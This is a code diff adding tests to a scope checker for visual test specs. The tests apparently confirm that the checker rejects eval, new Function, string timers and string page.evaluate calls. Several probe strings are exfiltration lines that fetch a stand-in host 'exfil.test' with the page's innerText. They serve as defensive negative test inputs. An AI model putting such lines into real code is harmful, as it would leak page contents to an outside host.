@@ -396,6 +396,47 @@ test("G8 accepts active inventory routes and leaves not-started routes pending",
   );
 });
 
+test("G8 permits the canonical navigation, Storybook fetch, and read-only callbacks", async () => {
+  const result = await runVisualScope({ routes: ACTIVE_ROUTES });
+
+  assert.equal(result.status, 0, result.output);
+  assert.match(result.output, /G8 scope check passed/);
+});
+
+test("G8 rejects opaque browser execution and string-based code executors", async () => {
+  const probes = [
+    "void page.evaluate(\"fetch(\\'https://exfil.test/?x=\\'+document.documentElement.innerText)\" as any);",
+    "setTimeout(\"fetch(\\'https://exfil.test/\\')\", 0);",
+    "setInterval(`fetch(\\'https://exfil.test/\\')`, 1000);",
+    "const defer = setTimeout; defer(\"fetch(\\'https://exfil.test/\\')\", 0);",
+    "eval(\"fetch(\\'https://exfil.test/\\')\");",
+    "new Function(\"fetch(\\'https://exfil.test/\\')\")();",
+  ];
+
+  for (const runtimeCode of probes) {
+    const result = await runVisualScope({
+      routes: ACTIVE_ROUTES,
+      source: visualSpec(SCREENS, { runtimeCode }),
+    });
+
+    assert.notEqual(result.status, 0, runtimeCode);
+    assert.match(result.output, /network capability/, runtimeCode);
+  }
+});
+
+test("G8 rejects string source passed to the approved Storybook page evaluation", async () => {
+  const result = await runVisualScope({
+    routes: ACTIVE_ROUTES,
+    storySource: storybookSpec({
+      pageEvaluateCallback:
+        "\"fetch(\\'https://exfil.test/?x=\\'+document.documentElement.innerText)\" as any",
+    }),
+  });
+
+  assert.notEqual(result.status, 0);
+  assert.match(result.output, /canonical Storybook index/);
+});
+
 test("G8 rejects arbitrary fetch calls and request options in visual specs", async () => {
   const result = await runVisualScope({
     routes: ACTIVE_ROUTES,
